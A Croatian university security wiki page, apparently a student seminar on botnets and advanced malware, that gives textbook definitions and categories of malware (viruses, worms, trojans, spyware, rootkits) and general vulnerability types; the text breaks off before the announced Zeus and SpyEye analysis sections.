<!DOCTYPE html>
<html lang="hr" dir="ltr">
<head>
<meta charset="UTF-8" />
<title>Botneti i napredni oblici malwarea - analiza zeus / spyeye sourcea - SIS Wiki</title>
<meta name="generator" content="MediaWiki 1.17.0" />
<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch_desc.php" title="SIS Wiki (hr)" />
<link rel="EditURI" type="application/rsd+xml" href="../../api.php%3Faction=rsd" />
<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_/_spyeye_sourcea&amp;action=creativecommons" rel="meta" />
<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
<link rel="stylesheet" href="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
<meta name="ResourceLoaderDynamicStyles" content="" />
<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
<body class="mediawiki ltr ns-0 ns-subject page-Botneti_i_napredni_oblici_malwarea_-_analiza_zeus_spyeye_sourcea skin-vector">
		<div id="mw-page-base" class="noprint"></div>
		<div id="mw-head-base" class="noprint"></div>
		<!-- content -->
		<div id="content">
			<a id="top"></a>
			<div id="mw-js-message" style="display:none;"></div>
						<!-- firstHeading -->
			<h1 id="firstHeading" class="firstHeading">Botneti i napredni oblici malwarea - analiza zeus / spyeye sourcea</h1>
			<!-- /firstHeading -->
			<!-- bodyContent -->
			<div id="bodyContent">
				<!-- tagline -->
				<div id="siteSub">Izvor: SIS Wiki</div>
				<!-- /tagline -->
				<!-- subtitle -->
				<div id="contentSub"></div>
				<!-- /subtitle -->
																<!-- jumpto -->
				<div id="jump-to-nav">
					Skoči na: <a href="_spyeye_sourcea.html#mw-head">orijentacija</a>,
					<a href="_spyeye_sourcea.html#p-search">traži</a>
				</div>
				<!-- /jumpto -->
								<!-- bodytext -->
				<p>Preuzeli temu: Branko Rendulić, Anita Laktašić, Igor Mirković
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="_spyeye_sourcea.html#Uvod"><span class="tocnumber">1</span> <span class="toctext">Uvod</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="_spyeye_sourcea.html#Malware"><span class="tocnumber">2</span> <span class="toctext">Malware</span></a>
<ul>
<li class="toclevel-2 tocsection-3"><a href="_spyeye_sourcea.html#Definicija_malwarea"><span class="tocnumber">2.1</span> <span class="toctext">Definicija malwarea</span></a></li>
<li class="toclevel-2 tocsection-4"><a href="_spyeye_sourcea.html#Karakteristike_malwarea"><span class="tocnumber">2.2</span> <span class="toctext">Karakteristike malwarea</span></a></li>
<li class="toclevel-2 tocsection-5"><a href="_spyeye_sourcea.html#Na.C4.8Din_rada_malwarea_i_ranjivosti_koje_koristi"><span class="tocnumber">2.3</span> <span class="toctext">Način rada malwarea i ranjivosti koje koristi</span></a></li>
<li class="toclevel-2 tocsection-6"><a href="_spyeye_sourcea.html#Kategorizacija_malwarea"><span class="tocnumber">2.4</span> <span class="toctext">Kategorizacija malwarea</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-7"><a href="_spyeye_sourcea.html#Napredni_malware"><span class="tocnumber">3</span> <span class="toctext">Napredni malware</span></a>
<ul>
<li class="toclevel-2 tocsection-8"><a href="_spyeye_sourcea.html#Definicija_naprednog_malwarea"><span class="tocnumber">3.1</span> <span class="toctext">Definicija naprednog malwarea</span></a></li>
<li class="toclevel-2 tocsection-9"><a href="_spyeye_sourcea.html#.C5.BDivotni_ciklus_naprednog_malwarea"><span class="tocnumber">3.2</span> <span class="toctext">Životni ciklus naprednog malwarea</span></a></li>
<li class="toclevel-2 tocsection-10"><a href="_spyeye_sourcea.html#Svrha_naprednog_malwarea"><span class="tocnumber">3.3</span> <span class="toctext">Svrha naprednog malwarea</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-11"><a href="_spyeye_sourcea.html#Botneti"><span class="tocnumber">4</span> <span class="toctext">Botneti</span></a>
<ul>
<li class="toclevel-2 tocsection-12"><a href="_spyeye_sourcea.html#Definicija_botneta"><span class="tocnumber">4.1</span> <span class="toctext">Definicija botneta</span></a></li>
<li class="toclevel-2 tocsection-13"><a href="_spyeye_sourcea.html#Stvaranje_i_.C5.A1irenje_botneta"><span class="tocnumber">4.2</span> <span class="toctext">Stvaranje i širenje botneta</span></a>
<ul>
<li class="toclevel-3 tocsection-14"><a href="_spyeye_sourcea.html#Primjer_kreiranja_botneta_i_njegova_.C5.A1irenja"><span class="tocnumber">4.2.1</span> <span class="toctext">Primjer kreiranja botneta i njegova širenja</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-15"><a href="_spyeye_sourcea.html#Command_and_Control_infrastruktura"><span class="tocnumber">4.3</span> <span class="toctext">Command and Control infrastruktura</span></a>
<ul>
<li class="toclevel-3 tocsection-16"><a href="_spyeye_sourcea.html#Centralizirana_C.26C_struktura"><span class="tocnumber">4.3.1</span> <span class="toctext">Centralizirana C&amp;C struktura</span></a></li>
<li class="toclevel-3 tocsection-17"><a href="_spyeye_sourcea.html#Peer_to_Peer_.28P2P.29_C.26C_struktura"><span class="tocnumber">4.3.2</span> <span class="toctext">Peer to Peer  (P2P) C&amp;C struktura</span></a></li>
<li class="toclevel-3 tocsection-18"><a href="_spyeye_sourcea.html#Hibridna_C.26C_struktura"><span class="tocnumber">4.3.3</span> <span class="toctext">Hibridna C&amp;C struktura</span></a></li>
<li class="toclevel-3 tocsection-19"><a href="_spyeye_sourcea.html#Usporedba_C.26C_struktura"><span class="tocnumber">4.3.4</span> <span class="toctext">Usporedba C&amp;C struktura</span></a></li>
<li class="toclevel-3 tocsection-20"><a href="_spyeye_sourcea.html#Uloga_DNS-a_za_botnete"><span class="tocnumber">4.3.5</span> <span class="toctext">Uloga DNS-a za botnete</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-21"><a href="_spyeye_sourcea.html#Botnet_komunikacijski_protokoli"><span class="tocnumber">4.4</span> <span class="toctext">Botnet komunikacijski protokoli</span></a></li>
<li class="toclevel-2 tocsection-22"><a href="_spyeye_sourcea.html#Motivacija_i_koristi_od_botneta"><span class="tocnumber">4.5</span> <span class="toctext">Motivacija i koristi od botneta</span></a></li>
<li class="toclevel-2 tocsection-23"><a href="_spyeye_sourcea.html#Prevencija.2C_detekcija_i_prekidanje_botneta"><span class="tocnumber">4.6</span> <span class="toctext">Prevencija, detekcija i prekidanje botneta</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-24"><a href="_spyeye_sourcea.html#Zeus"><span class="tocnumber">5</span> <span class="toctext">Zeus</span></a>
<ul>
<li class="toclevel-2 tocsection-25"><a href="_spyeye_sourcea.html#Predstavljanje_Zeusa"><span class="tocnumber">5.1</span> <span class="toctext">Predstavljanje Zeusa</span></a></li>
<li class="toclevel-2 tocsection-26"><a href="_spyeye_sourcea.html#Zeus_toolkit"><span class="tocnumber">5.2</span> <span class="toctext">Zeus toolkit</span></a>
<ul>
<li class="toclevel-3 tocsection-27"><a href="_spyeye_sourcea.html#Postavljanje_okoline"><span class="tocnumber">5.2.1</span> <span class="toctext">Postavljanje okoline</span></a></li>
<li class="toclevel-3 tocsection-28"><a href="_spyeye_sourcea.html#Builder"><span class="tocnumber">5.2.2</span> <span class="toctext">Builder</span></a></li>
<li class="toclevel-3 tocsection-29"><a href="_spyeye_sourcea.html#Control_Panel"><span class="tocnumber">5.2.3</span> <span class="toctext">Control Panel</span></a></li>
<li class="toclevel-3 tocsection-30"><a href="_spyeye_sourcea.html#Zeus_Config"><span class="tocnumber">5.2.4</span> <span class="toctext">Zeus Config</span></a></li>
<li class="toclevel-3 tocsection-31"><a href="_spyeye_sourcea.html#Upravljanje_zara.C5.BEenim_ra.C4.8Dunalom"><span class="tocnumber">5.2.5</span> <span class="toctext">Upravljanje zaraženim računalom</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-32"><a href="_spyeye_sourcea.html#Analiza_zeus_bota"><span class="tocnumber">5.3</span> <span class="toctext">Analiza zeus bota</span></a>
<ul>
<li class="toclevel-3 tocsection-33"><a href="_spyeye_sourcea.html#Instalacija_bota_i_source"><span class="tocnumber">5.3.1</span> <span class="toctext">Instalacija bota i source</span></a></li>
<li class="toclevel-3 tocsection-34"><a href="_spyeye_sourcea.html#Komunikacija"><span class="tocnumber">5.3.2</span> <span class="toctext">Komunikacija</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-35"><a href="_spyeye_sourcea.html#Zaklju.C4.8Dak_o_zeusu"><span class="tocnumber">5.4</span> <span class="toctext">Zaključak o zeusu</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-36"><a href="_spyeye_sourcea.html#SpyEye"><span class="tocnumber">6</span> <span class="toctext">SpyEye</span></a>
<ul>
<li class="toclevel-2 tocsection-37"><a href="_spyeye_sourcea.html#Op.C4.87enito_o_SpyEye"><span class="tocnumber">6.1</span> <span class="toctext">Općenito o SpyEye</span></a></li>
<li class="toclevel-2 tocsection-38"><a href="_spyeye_sourcea.html#Zna.C4.8Dajke_SpyEye_alata"><span class="tocnumber">6.2</span> <span class="toctext">Značajke SpyEye alata</span></a></li>
<li class="toclevel-2 tocsection-39"><a href="_spyeye_sourcea.html#Na.C4.8Din_rada"><span class="tocnumber">6.3</span> <span class="toctext">Način rada</span></a>
<ul>
<li class="toclevel-3 tocsection-40"><a href="_spyeye_sourcea.html#Dodaci_SpyEyeu"><span class="tocnumber">6.3.1</span> <span class="toctext">Dodaci SpyEyeu</span></a></li>
<li class="toclevel-3 tocsection-41"><a href="_spyeye_sourcea.html#A.C5.BEuriranje_aplikacije"><span class="tocnumber">6.3.2</span> <span class="toctext">Ažuriranje aplikacije</span></a></li>
<li class="toclevel-3 tocsection-42"><a href="_spyeye_sourcea.html#U.C4.8Ditavanje_i_izvr.C5.A1avanje_aplikacija_na_botu"><span class="tocnumber">6.3.3</span> <span class="toctext">Učitavanje i izvršavanje aplikacija na botu</span></a></li>
</ul>
</li>
<li class="toclevel-2 tocsection-43"><a href="_spyeye_sourcea.html#SpyEye_analiza"><span class="tocnumber">6.4</span> <span class="toctext">SpyEye analiza</span></a></li>
<li class="toclevel-2 tocsection-44"><a href="_spyeye_sourcea.html#Hibrid_SpyEye_i_Zeus_trojanaca"><span class="tocnumber">6.5</span> <span class="toctext">Hibrid SpyEye i Zeus trojanaca</span></a></li>
</ul>
</li>
<li class="toclevel-1 tocsection-45"><a href="_spyeye_sourcea.html#Zaklju.C4.8Dak"><span class="tocnumber">7</span> <span class="toctext">Zaključak</span></a></li>
<li class="toclevel-1 tocsection-46"><a href="_spyeye_sourcea.html#Literatura"><span class="tocnumber">8</span> <span class="toctext">Literatura</span></a></li>
<li class="toclevel-1 tocsection-47"><a href="_spyeye_sourcea.html#Podjela_rada"><span class="tocnumber">9</span> <span class="toctext">Podjela rada</span></a></li>
</ul>
</td></tr></table>
<h2> <span class="mw-headline" id="Uvod">Uvod</span></h2>
<p>U današnje vrijeme sigurnost informacijskih sustava može biti narušena raznim oblicima malwarea koji postaju sve napredniji, a tako i manje primjetljivi. Možemo reći da maliciozni softver zauzima veoma važnu poziciju u svijetu tehnologije te da je iz tog razloga potrebna velika svjesnost o opasnosti do koje malware može dovesti i štete koju može prouzročiti. S uspjehom Interneta, odnosno njegovim masovnim korištenjem od strane ljudske populacije, stvorio se temelj za širenje infekcija malwareom, koje mogu utjecati na veliki broj sustava, pa čak i nekoliko milijuna, diljem svijeta. Tako je u današnje vrijeme poznata i mogućnost kontroliranja mreža inficiranih računala što nas vodi do botneta o kojima će biti riječ u radu. Međutim, prije svega, bitno je spomenuti da se sama motivacija za kreiranjem malwarea kroz zadnjih nekoliko godina drastično promijenila. Radi se o tome da je prije cilj stvaranja malwarea bilo uspostavljanje reputacije među zajednicom tehnološki vještih pojedinca, dok je u današnje vrijeme cilj provođenje raznih vrsta kriminala radi stjecanja financijskih koristi, a koje je potaknuto pojavom financijskih i sličnih servisa na Internetu. U ovom radu ćemo se na početku pozabaviti terminima kao što su malware i napredni malware, što će nam dati temelje za nastavak u kojemu ćemo govoriti o botnetima, što ćemo potkrijepiti i analizom dva moćna alata, tj. analizom Zesus-a i Spyeye-a.
</p>
<h2> <span class="mw-headline" id="Malware">Malware</span></h2>
<p>Malware predstavlja veliku prijetnju za sigurnost pojedinca, ali i za nacionalnu sigurnost te je potrebna odgovarajuća strategija kako bi se što je više moguće smanjila njegova prijetnja. U zadnjih nekoliko godina došlo je do velikog vala u pogledu korištenja malwarea za napad na informacijske sustave radi prikupljanja informacija, krađe novca, krađe identiteta, onemogućavanja pristupa korisnika osnovnim uređajima, ometanja rada sustava itd., te je stoga potrebno veliku pozornost obratiti na vođenje brige o sigurnosti sustava. U nastavku definirat ćemo pojam malwarea, njegove karakteristike, način rada, te upoznati se s kategorijama malwarea kako bismo se što bolje pripremili za iduću cjelinu koja se odnosi na napredni malware.
</p>
<h3> <span class="mw-headline" id="Definicija_malwarea">Definicija malwarea</span></h3>
<p>Već u samom uvodu o malwareu možemo otprilike zaključiti što malware jest, no u ovoj cjelini ćemo iznesti preciznu definiciju malwarea.
</p><p><i>„Malware je opći izraz za dio softvera ubačenog u informacijski sustav radi uzrokovanja štete tom sustavu ili drugim sustavima, ili radi obaranja tih sustava za njihovo korištenje u druge svrhe nego li u one koje namjerava vlasnik.“</i> (prema <a href="http://www.oecd.org/dataoecd/53/34/40724457.pdf" class="external text" rel="nofollow">OECD-u</a>, 2008., str. 10)
</p><p>Iz same definicije malwarea možemo vidjeti da malware predstavlja negativan i nepoželjan softver (tzv. maliciozni softver) u domeni računalnih softvera, a koji se temelji na radu sposobnih programera, te da upravo radi toga moramo biti veoma oprezni i poduzeti određene mjere kako bi nam sustav bio što sigurniji. Također, malware predstavlja izraz koji koriste računalni profesionalci za različite oblike neprijateljskog i ometajućeg softvera ili programskog koda. 
Sama svrha malwarea je ometanje ili uskraćivanje operacija korisniku sustava, oštećivanje informacijskog sustava, sakupljanje informacija radi narušavanja privatnosti ili radi iskorištavanja informacija u napadačeve svrhe, slanje snimljenih informacija trećoj strani bez znanja odnosno dozvole korisnika, ostvarenje neautoriziranog pristupa u resurse sustava, te narušavanje integriteta podataka. (prema <a href="http://en.wikipedia.org/wiki/Malware#cite_note-0" class="external text" rel="nofollow">Wikipediji</a>)
</p><p>Postoje različiti tipovi malwarea o kojima će više biti riječ u dijelu o kategorizaciji malwaerea, a svaki tip odgovara samoj funkcionalnosti i ponašanju malwarea.
</p><p>Stručnjaci iz područja sigurnosti, često grupiraju malware u dvije osnovne kategorije: obitelj i varijanta, pri čemu se obitelj odnosi na posebne ili originalne dijelove malwarea, a varijanta na različite verzije originalnog malicioznog koda ili na obitelj sa manjim promjenama. (prema <a href="http://www.oecd.org/dataoecd/53/34/40724457.pdf" class="external text" rel="nofollow">OECD-u</a>, 2008., str. 10)
</p><p>Korištenje malwarea i negativan utjecaj koji ima na naše društvo je u porastu, te je pitanje da li je to posljedica značajnog porasta u sofisticiranosti tehnologije malwarea. Naime, malwarei su prisutni u računalnom društvu već mnogo godina i postavlja nam se pitanje što se može naučiti iz prošlosti. Gledajući s jedne strane, jedni su naučili da je pisanje dobrog i kompletnog autonomnog malwarea vjerojatno veoma teško, a drugi da je obraćanje pozornosti na sigurnost sve važnije. Međutim, bez obzira na to koliko teško bilo pisanje dobrih malwarea, još uvijek izlaze „snažni“ malwarei koje moramo na vrijeme otkriti i na odgovarajući način  ukloniti.
</p>
<h3> <span class="mw-headline" id="Karakteristike_malwarea">Karakteristike malwarea</span></h3>
<p>U ovom dijelu navesti ćemo neke od osnovnih karakteristika malwarea na temelju njihove funkcionalnosti i ponašanja. Te karakteristike su: (prema <a href="http://www.oecd.org/dataoecd/53/34/40724457.pdf" class="external text" rel="nofollow">OECD-u</a>, 2008., str. 11) 
</p>
<ul><li>multifunkcionalnost i modularnost
</li><li>dostupnost i primjerenost korisnicima (engl. user friendly)
</li><li>upornost i učinkovitost
</li><li>mogućnost djelovanja na skup uređaja
</li><li>malware je dio širokog sustava cyber napada
</li><li>profitabilnost
</li></ul>
<p>Multifunkcionalnost i modularnost malwarea odnosi se na to da mnogo vrsta malwarea mogu biti skupa ili odvojeno korišteni radi postizanja napadačevih ciljeva. Tako primjerice malware koji je već u sustavu, može sa Interneta skinuti dodatni malware kako bi povećao svoju funkcionalnost. 
</p><p>Dostupnost kao karakteristika malwarea se odnosi na to da je malware dostupan na Internetu te da ga svatko može preuzeti, kupiti i dr.. Naime, postoji i podzemno tržište (engl. underground market) gdje je moguće prodavati i kupovati malware. Što se tiče primjerenosti korisnicima, misli se na to da malware omogućava napadačima sofisticirane napade van njihove razine vještina.
</p><p>Karakteristika koja se odnosi na upornost malwarea podrazumijeva to da je malware na sustavu veoma teško detektirati i ukloniti iz sustava, a učinkovitost se odnosi na to da malware može pobijediti ugrađene mjere sigurnosti sustava.
</p><p>Jedna od karakteristika malwarea je i mogućnost malwarea da djeluje na skup uređaja jer kako je malware dio softvera, može utjecati na skup uređaja poput računala, PDA-ova itd.
</p><p>Karakteristika malwarea koja se odnosi na to da je malware je dio širokog sustava cyber napada podrazumijeva to da se malware koristi kao osnovna forma za cyber napad, ali i kao podrška drugim formama malicioznih aktivnosti (npr. za spam, phising).  
</p><p>I zadnja navedena karakteristika malwarea je profitabilnost, a pod time se misli da je malware u današnje vrijeme ozbiljan posao i izvor prihoda za napadače diljem svijeta što predstavlja ujedno računalni kriminal.
</p>
<h3> <span class="mw-headline" id="Na.C4.8Din_rada_malwarea_i_ranjivosti_koje_koristi">Način rada malwarea i ranjivosti koje koristi</span></h3>
<p>Već smo prije ukratko spomenuli što sve može učiniti neki malware, a u ovom dijelu ćemo opisati na koji način to malware izvodi i koje su to ranjivosti koje omogućavaju širenje malwarea. 
Iz definicije malwarea mogli smo vidjeti da malware predstavlja dio softvera ubačenog u sustav radi pravljenja nekog oblika štete, a da bi uopće mogao ući u sustav potrebni su odgovarajući faktori poput neosiguranosti operacijskog sustava i povezane ranjivosti softvera. Naime, neki softveri na sustavu mogu sadržavati ranjivosti ili rupe koji su rezultat lošeg ili nepromišljenog kodiranja što daje dobru podlogu napadačima za napad na sustav nekim malwareom. Osim toga, ponekad neispravna ili nepotpuna konfiguracija softvera može omogućiti lakši napad. Primjerice kod kupnje softvera ili instalacije određenog softvera automatski neke postavke se postavljaju na „off“, pa ukoliko se radi o neiskusnom korisniku nesvjesno se izlaže napadu. 
</p><p>Želimo li preciznije definirati ranjivosti možemo ih svrstati u nekoliko tipova: (prema <a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external text" rel="nofollow">IATAC-u</a>, 2009., str. 16)
</p>
<ul><li>Prelijevanje međuspremnika (engl. buffer overflow) – tu se ustvari radi o mani dizajna, odnosno nedostatku ili neuspjehu ulazne validacije da se spriječi dostava predugih nizova podataka (engl. data strings)
</li><li>Slaba kontrola pristupa – zbog loše projektirane ili konfigurirane kontrole pristupa
</li><li>Slabo ili netočno rukovanje malformiranim podacima – zbog nedostatka ili neuspjeha ulazne validacije da filtrira malformirane podatke
</li><li>Pogreške kod dekodiranja – npr. preglednikove ili od Web servera URL pogreške kod dekodiranja
</li><li>Sabotirane konfiguracije – npr. kroz radnje sa konfiguracijskom skriptom
</li><li>Ranjivosti u anti-virus softveru – iskorištavanje za onemogućavanje softvera ili izbjegavanje detekcije
</li></ul>
<p>Sve ranjivosti, u slučaju njihova otkrivanja od strane napadača, kao što je spomenuto, pružaju dobar temelj napadaču. Upravo otkrivanjem tih ranjivosti prije ostalih, napadač može razviti malware koji će iskoristiti te ranjivosti za maliciozne svrhe. Nakon razvijanja malwarea i inicijative napada od strane napadača, malware radi na način da se sam pokrene ili instalira na informacijski sustav manualno ili automatski. Nakon otkrivanja određenih ranjivosti od strane sigurnosne zajednice, ona razvija zakrpu (engl. patch, fix) što dalje onemogućuje napad od strane nekog napadača malwareom. 
</p><p>Način rada malwarea ovisi i o tome o kojemu se malwareu radi, pa tako neki poput virusa i trojanskih konja zahtijevaju interakciju s korisnikom da bi se pokrenuo proces infekcije, nakon čega malware može instalirati dodatne funkcionalnosti kao što su backdoor, rootkit, spyware itd.. 
</p><p>Jedni od najčešćih vektora za širenje malwarea su e-mail (npr. spam i drugi pishing e-mailovi), web stranice, instantne poruke, prijenosni mediji poput kompaktnih diskova, usb-ova, IRC (Internet Relay Chat), Bluetooth i bežična lokalna područna mreža (engl. Wireless local area network) (prema <a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external text" rel="nofollow">IATAC-u</a>, 2009., str. 17), a jedna od veoma zanimljivih tehnika koja pospješuje širenje malwarea je i socijalni inženjering. Pojam socijalni inženjering definira se kao čin manipuliranja osobom kako bi se postigli ciljevi koji mogu ili ne mogu biti u najboljem interesu „mete“. To može uključivati dobivanje informacija, pristupa ili navođenje „mete“ da poduzme određene akcije (prema <a href="http://www.social-engineer.org/" class="external text" rel="nofollow">The Official Social Engineering Portal</a>). Primjerice, socijalnim inženjeringom se uvjerava korisnika da klikne na maliciozni link ili skine malware putem e-maila čega smo često i sami svjedoci.
</p>
<h3> <span class="mw-headline" id="Kategorizacija_malwarea">Kategorizacija malwarea</span></h3>
<p>Prvi malware koji se pojavio je bio kompjuterski virus, te se tako izraz virus počeo mijenjati s pojmom malware, iako je virus samo jedna od kategorija malwarea. Osim virusa postoje još druge kategorije malwarea poput crva, trojanskih konja, spywarea i drugih od kojih će neki i u nastavku biti prikazani i  ukratko opisani.
</p><p><i>Virusi</i>
</p><p>Virus je oblik malwarea koji se replicira odnosno umnožava vezanjem svojih programskih instrukcija na uobičajen program „hosta“ ili dokument, pa se instrukcije virusa izvršavaju kada se program hosta izvršava (prema <a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external text" rel="nofollow">IATAC-u</a>, 2009., str. 7). Dakle, jednom kad je virus instaliran, izvršiti će se, zaraziti datoteke sustava, i pokušati proširiti na druge sustave. Sam utjecaj virusa varira široko od sporijih performansi sustava pa do brisanja datoteka na računalu. Neki od tipovi virusa unutar kategorije virusa su File virus, Boot Sector virus, Macro virus, Electronic mail virus, Multi-variant virus, Radio Frequency Identification (RFID) virus.
</p><p><i>Mrežni crv</i>
</p><p>Mrežni crv je program koji se aktivno prenosi mrežom, obično Internetom, kako bi zarazio druga računala (prema <a href="http://en.wikipedia.org/wiki/Malware#cite_note-0" class="external text" rel="nofollow">Wikipediji</a>). Za razliku od virusa, crvi ne moraju ovisiti o drugim programima ili akcijama korisnika za njegovo širenje ili izvršavanje. Crvi se šire na način da lociraju potencijalne ranjive hostove, te onda kopiraju svoje programske instrukcije na te hostove. Neki od crva su Email worm, Instant messaging worm, Internet Relay Chat worm, Web or Internet worm, File-sharing or peer-to-peer (P2P) worm i drugi.
</p><p><i>Trojanski konj (Trojanac)</i>
</p><p>Trojanski konj dobio je ime po Trojanskom konju iz grčke mitologije radi njegova ponašanja. Naime, trojanski konj je destruktivni program koji se pojavljuje kao bezopasan, ali je zapravo jedan od najopasnijih tipova malwarea (prema <a href="http://www.spamlaws.com/malware-types.html" class="external text" rel="nofollow">Spam Laws</a>). Primjerice, može se pojaviti kao prijateljski e-mail prilog ili se predstaviti kao korisna aplikacija na web stranicama, a instalira se na korisnikovo računalo nakon što korisnik otvori e-mail prilog ili skine aplikaciju s trojanskim konjem. Nakon što se instalira, softver može biti kontroliran od strane napadača za razne maliciozne svrhe. Neki od postojećih trojanaca su Backdoor Trojan (Denial of service (DoS) Trojan, FTP Trojan), Data-collecting Trojan (Spyware Trojan, Keylogger, Screenlogger, Password SpyWare Tojan, Notifier), Downloader ili Dropper (Security software disabler, Rogue security software, ArcBomb), Proxy Trojan, Rootkit, Bot (Botnet).
</p><p><i>Spyware (ne Trojanac)</i>
</p><p>Spyware predstavlja softver koji sakuplja informacije i prenosi ih zainteresiranoj strani (prema <a href="http://ist.mit.edu/security/malware" class="external text" rel="nofollow">Information Services &amp; Technology</a>). Iako nije trojanac, provodi iste akcije i ima iste ciljeve kao i Spyware Trojan. Osim toga, mnogo botova ima mogućnosti spywarea te se znaju nazivati spybotovima. Neki tipovi Spywarea su Adware i Tracking Cookie.
</p><p><i>Miješani napadi</i>
</p><p>Miješani napad (engl. Blended attack) je instanca malwarea koja koristi višestruke infekcije i metode prijenosa (prema <a href="http://csrc.nist.gov/publications/nistpubs/800-83/SP800-83.pdf" class="external text" rel="nofollow">NIST-u</a>, 2005., str. 19). Naime, miješani napad kombinira svojstva više tipova malwarea poput virusa, crva, trojanaca, botova i adwarea.
</p><p><i>Ugrađeni maliciozni kod</i>
</p><p>Ugrađeni maliciozni kod (Engl. Embedded Malicious code) odnosi se na bilo koji tip maliciozne logike koja je uključena u valjani izvršni program od strane developera, integratora, distributera ili instalera, a najčešće je to logička bomba, vremenska bomba ili trojanac. (prema <a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external text" rel="nofollow">IATAC-u</a>, 2009., str. 15)
</p><p><i>Alati napadača</i>
</p><p>Alati napadača (engl. Attacker Tools) predstavljaju alate koji mogu biti dostavljeni u sustav kao dio malwarea, a koji dopuštaju napadačima neovlašteni pristup radi korištenja inficiranih sistema i njihovih podataka ili radi provođenja dodatnih napada. Ti alati mogu biti dostavljeni sami kao dio malwarea ili mogu biti dostavljeni nakon što se dogodi infekcija. 
Neki od popularnijih tipova alata napadača su backdoorovi, keystroke loggeri, rootkiti i botneti te možemo vidjeti da su ti alati svrstani i u prethodno spomenutoj kategoriji kao tipovi trojanaca, a to je iz razloga što oni mogu biti dostavljeni unutar trojanskog konja. 
</p>
<ul><li><i>Backdoor</i> je maliciozni program koji sluša naredbe na određenom TCP ili UDP portu. Većina backdoorova se sastoji od klijentske i serverske komponente pri čemu klijent boravi na napadačevom udaljenom računalu, a server boravi na inficiranom sustavu. Nakon što je uspostavljena veza između klijenta i servera, udaljeni napadač ima neki stupanj kontrole nad inficiranim računalom (prema <a href="http://csrc.nist.gov/publications/nistpubs/800-83/SP800-83.pdf" class="external text" rel="nofollow">NIST-u</a>, 2005., str. 21)(npr. napadač može  prenositi datoteke, zahtijevati lozinke, izvršavati samovoljne naredbe itd.).
</li></ul>
<ul><li><i>Keystroke Loggers</i> poznati kao i <i>keyloggers</i>, prate i snimaju korištenje tipkovnice, te na taj način mogu snimiti korisnikovo unošenje lozinke, broj kreditne kartice ili druge informacije koje mogu biti iskorištene.
</li></ul>
<ul><li><i>Rootkiti</i> predstavljaju skup programa koji koriste napadači kako bi izbjegli detekciju dok pokušavaju postići neautorizirani pristup na računalo korisnika (prema <a href="http://iac.dtic.mil/iatac/download/malware.pdf" class="external text" rel="nofollow">IATAC-u</a>, 2009., str. 13). Rootkiti dopuštaju skrivanje modificirajući operacijski sustav korisnikova računala, kako bi malware ostao skriven od korisnika te tako mogu spriječiti da maliciozni proces bude vidljiv u listi sistemskih procesa ili pak mogu onemogućiti čitanje svojih datoteka. Osim toga, omogućuju napadaču administratorski pristup korisnikovom računalu.
</li></ul>
<ul><li><i>Botneti</i> se odnose na koordinacijske sustave koje koriste napadači kako bi koordinirali aktivnosti više inficiranih računala, a detaljnije o njima biti će rečeno u posebnoj cjelini. 
</li></ul>
<p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Zastupljenost.png" class="image"><img alt="Zastupljenost.png" src="../../images/5/5b/Zastupljenost.png" width="500" height="310" /></a>
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Anita.laktasic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Anita.laktasic (stranica ne postoji)">Anita Laktašić</a> 13:46, 28. prosinca 2011. (CET)
</p>
<h2> <span class="mw-headline" id="Napredni_malware">Napredni malware</span></h2>
<p>Napredni malware postigao je veoma značajan status među profesionalcima koji se bave sigurnošću. Naime, u današnje vrijeme kompanije su sve više prisiljene usvojiti otvoreniji pristup praksi, a napadači koriste široko dostupne alate za razvoj i implementaciju malwarea koji su sposobni izbjeći detekciju, čak i od strane najboljih anti-malware alata. Neki od primjera naprednih malwarea su Aurora, Zeus Spyeye, TDL Gang, a kasnije u radu upravo ćemo i analizirati jedne od njih, tj. Zeus-a i Spyeye-a.  
</p>
<h3> <span class="mw-headline" id="Definicija_naprednog_malwarea">Definicija naprednog malwarea</span></h3>
<p>Bez obzira koriste li napadači viruse, trojance, botove ili rootkite, današnji malwarei su dizajnirani za dugoročnu kontrolu nad ugroženim računalima. Prije su napadači kompromitirali sustave radi hvaljenja, a postajući sve svjesniji vrijednosti informacija do kojih mogu doći, prebacili su se na razvoj malwarea u profitne svrhe. Tako sada napadači s profitnim ili pak političkim motivima postaju glavni razlog pojave velikog broja malwarea. To predstavlja veliki problem za sigurnost pojedinaca, poslovnu sigurnost, ali i nacionalnu sigurnost.
</p><p>Samim širenjem Weba i njegovih sadržaja, stvorio se dodatan temelj za širenje malwarea jer mogu biti ubačeni u razne sadržaje, a da korisnik to ne zna. Međutim, u današnje vrijeme se pojavljuju napredni malwarei koji su dinamičniji i neprimjetniji, i koji iskorištavaju nepoznate ranjivosti u velikom broju aplikacija i komunikacijskih protokola što veoma otežava njihovu detekciju.
